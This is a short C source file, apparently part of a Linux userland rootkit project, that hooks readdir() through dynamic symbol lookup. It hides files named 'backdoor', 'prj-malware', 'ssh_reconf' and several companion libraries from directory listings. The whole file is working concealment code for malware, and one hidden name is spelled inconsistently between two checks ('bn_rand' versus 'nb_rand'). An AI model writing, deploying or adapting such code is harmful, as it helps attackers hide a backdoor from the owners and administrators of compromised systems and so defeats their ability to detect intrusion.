#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

typedef struct dirent* (*ls_t)(DIR*);

struct dirent* readdir(DIR* dirp) {
  
  ls_t original_readdir = (ls_t)dlsym(RTLD_NEXT, "readdir");
  struct dirent* entry;
  do {
    
    entry = original_readdir(dirp);
    
    if (entry != NULL && (strcmp(entry->d_name, "lib-accept-connect.so") == 0 || strcmp(entry->d_name, "backdoor") == 0 || strcmp(entry->d_name, "lib-rand.so") == 0 || strcmp(entry->d_name, "lib-hide-files.so") == 0 || strcmp(entry->d_name, "prj-malware") == 0 || strcmp(entry->d_name, "bn_rand") == 0 || strcmp(entry->d_name, "ssh_reconf") == 0)) {
      entry = original_readdir(dirp);
    }
  } while (entry != NULL && (strcmp(entry->d_name, "lib-accept-connect.so") == 0 || strcmp(entry->d_name, "backdoor") == 0 || strcmp(entry->d_name, "lib-rand.so") == 0 || strcmp(entry->d_name, "lib-hide-files.so") == 0 || strcmp(entry->d_name, "prj-malware") == 0 || strcmp(entry->d_name, "nb_rand") == 0 || strcmp(entry->d_name, "ssh_reconf") == 0));
  return entry;
}
